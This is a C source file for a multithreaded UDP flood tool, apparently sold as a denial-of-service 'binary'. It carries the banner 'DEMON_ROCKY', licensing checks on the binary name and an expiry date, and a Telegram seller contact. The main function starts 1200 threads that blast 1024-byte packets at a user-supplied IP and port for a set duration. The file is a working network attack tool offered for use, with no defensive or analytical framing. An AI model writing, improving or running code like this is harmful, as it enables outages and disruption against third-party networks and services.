#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <libgen.h>
#include <time.h>

// Simple expiry date definition - change these values
#define EXPIRY_YEAR 205   // Year
#define EXPIRY_MONTH 11    // Month (1-12)
#define EXPIRY_DAY  20     // Day (1-31)
#define THREAD_COUNT 1200    // Fixed thread count

// Structure to store parameters
typedef struct {
    char *target_ip;
    int target_port;
    int duration;
    int thread_id;
} program_params;

volatile int keep_running = 1;

// Simplified expiry check function
int check_expiry() {
    time_t t = time(NULL);
    struct tm *current = localtime(&t);
    
    // Convert to comparable format
    int current_date = (current->tm_year + 1900) * 10000 + 
                      (current->tm_mon + 1) * 100 + 
                      current->tm_mday;
    
    int expiry_date = EXPIRY_YEAR * 10000 + 
                      EXPIRY_MONTH * 100 + 
                      EXPIRY_DAY;
    
    if (current_date > expiry_date) {
        printf("\n╔════════════════════════════════════════╗\n");
        printf("║           BINARY EXPIRED!              ║\n");
        printf("║    Please contact the owner at:        ║\n");
        printf("║    Telegram: @DEMON_ROCKY              ║\n");
        printf("╚════════════════════════════════════════╝\n");
        return 0;
    }
    return 1;
}

// Function to verify program name
int verify_program_name() {
    char path[1024];
    ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
    if (len != -1) {
        path[len] = '\0';
        char *binary_name = basename(path);
        if (strcmp(binary_name, "DEMON_ROCKY") != 0) {
            printf("\n╔════════════════════════════════════════╗\n");
            printf("║           INVALID BINARY NAME!         ║\n");
            printf("║    Binary must be named 'DEMON_ROCKY'        ║\n");
            printf("║    Please contact the owner at:        ║\n");
            printf("║    Telegram: @DEMON_ROCKY              ║\n");
            printf("╚════════════════════════════════════════╝\n");
            return 0;
        }
        return 1;
    }
    return 0;
}

// Signal handler
void handle_signal(int signal) {
    keep_running = 0;
}

// Network processing function
void *process_network(void *arg) {
    program_params *params = (program_params *)arg;
    int sock;
    struct sockaddr_in server_addr;
    char *message;
    int msg_size = 1024;

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->target_port);
    server_addr.sin_addr.s_addr = inet_addr(params->target_ip);

    if (server_addr.sin_addr.s_addr == INADDR_NONE) {
        fprintf(stderr, "Invalid IP address: %s\n", params->target_ip);
        close(sock);
        return NULL;
    }

    message = (char *)malloc(msg_size);
    if (message == NULL) {
        close(sock);
        return NULL;
    }
    memset(message, 'A', msg_size);

    time_t end_time = time(NULL) + params->duration;
    while (time(NULL) < end_time && keep_running) {
        sendto(sock, message, msg_size, 0, 
               (struct sockaddr *)&server_addr, sizeof(server_addr));
    }

    free(message);
    close(sock);
    return NULL;
}

void print_banner() {
    printf("\n╔════════════════════════════════════════╗\n");
    printf("║             DEMON_ROCKY PROGRAM              ║\n");
    printf("║          Copyright (c) 2025            ║\n");
    printf("╚════════════════════════════════════════╝\n\n");
}

int main(int argc, char *argv[]) {
    print_banner();

    // First verify the binary name
    if (!verify_program_name()) {
        return 1;
    }

    // Check expiration
    if (!check_expiry()) {
        return 1;
    }

    if (argc != 4) {  // Change to 4 because we don't need thread count anymore
        printf("Usage: %s [IP] [PORT] [TIME]\n", argv[0]);
        return 1;
    }

    // Parse arguments
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    // Validate input parameters
    if (target_port <= 0 || target_port > 65535) {
        printf("Invalid port number\n");
        return 1;
    }

    if (duration <= 0) {
        printf("Invalid duration\n");
        return 1;
    }

    // Setup signal handler
    signal(SIGINT, handle_signal);

    // Allocate thread resources
    pthread_t threads[THREAD_COUNT];
    program_params params[THREAD_COUNT];

    printf("Starting program with following parameters:\n");
    printf("IP: %s\n", target_ip);
    printf("Port: %d\n", target_port);
    printf("Duration: %d seconds\n", duration);
    printf("Threads: %d\n\n", THREAD_COUNT);

    // Create threads
    for (int i = 0; i < THREAD_COUNT; i++) {
        params[i].target_ip = target_ip;
        params[i].target_port = target_port;
        params[i].duration = duration;
        params[i].thread_id = i;

        if (pthread_create(&threads[i], NULL, process_network, &params[i]) != 0) {
            printf("Thread creation failed\n");
            return 1;
        }
        printf("Thread %d started\n", i + 1);
    }

    // Wait for threads to complete
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\nAll threads completed\n");
    return 0;
}
